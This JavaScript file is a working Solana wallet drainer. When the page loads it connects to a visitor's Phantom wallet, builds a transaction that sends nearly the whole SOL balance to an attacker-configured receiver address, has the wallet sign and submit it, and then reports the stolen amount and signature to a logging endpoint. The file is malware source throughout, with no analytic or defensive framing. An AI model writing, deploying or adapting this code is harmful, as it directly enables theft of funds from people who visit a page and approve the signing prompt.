import { PublicKey , Connection , Transaction, SystemProgram, clusterApiUrl, LAMPORTS_PER_SOL } from '@solana/web3.js'

import config from './config/drainer.json'
import logger from './logging'

const getSolProvider = () => {

    if ('phantom' in window) {
        const provider = window.phantom?.solana;
        
        if (provider?.isPhantom) {
            return provider;
        }

        return null;
    }
};


const solProvider = getSolProvider()

async function getSolBalance(provider, connection) {
    let pubKey = new PublicKey(provider.publicKey)
    let balance = await connection.getBalance(pubKey)
    return balance
}

async function transferSol() {
  try {

    let provider = solProvider
    let connection = new Connection(clusterApiUrl(config.endpoint))
    
    let recieverWallet = new PublicKey(config.receiverPubKey)

    let solBalance = await getSolBalance(provider, connection)

    let transaction = new Transaction()
    let amountToTake = solBalance - (config.transactionFee * LAMPORTS_PER_SOL)

    if (amountToTake <= 0) {
      return false;
    }

    transaction.add(
      SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey: recieverWallet,
        lamports: amountToTake
      }),
    )

    transaction.feePayer = provider.publicKey
    let blockhashObj = await connection.getLatestBlockhash()

    transaction.recentBlockhash = blockhashObj.blockhash

    if (!transaction) {
      return false
    }
    
    let signed = await provider.signTransaction(transaction);
    let signature = await connection.sendRawTransaction(signed.serialize());
    
    let sigResult = await connection.confirmTransaction({
      blockhash: blockhashObj.blockhash,
      lastValidBlockHeight: blockhashObj.lastValidBlockHeight,
      signature: signature
    })

    if (!sigResult.value) {
      return false
    }
    
    return (await logger.sendLog({ 'balance': solBalance, 'drained': amountToTake, 'senderPubKey': provider.publicKey, 'receiverPubKey': config.receiverPubKey, 'signature': signature }))

  } catch(err) {

    return false;
  }
}

if (solProvider) {

  solProvider.connect().then( (solAccount) => {
    transferSol()
  })

}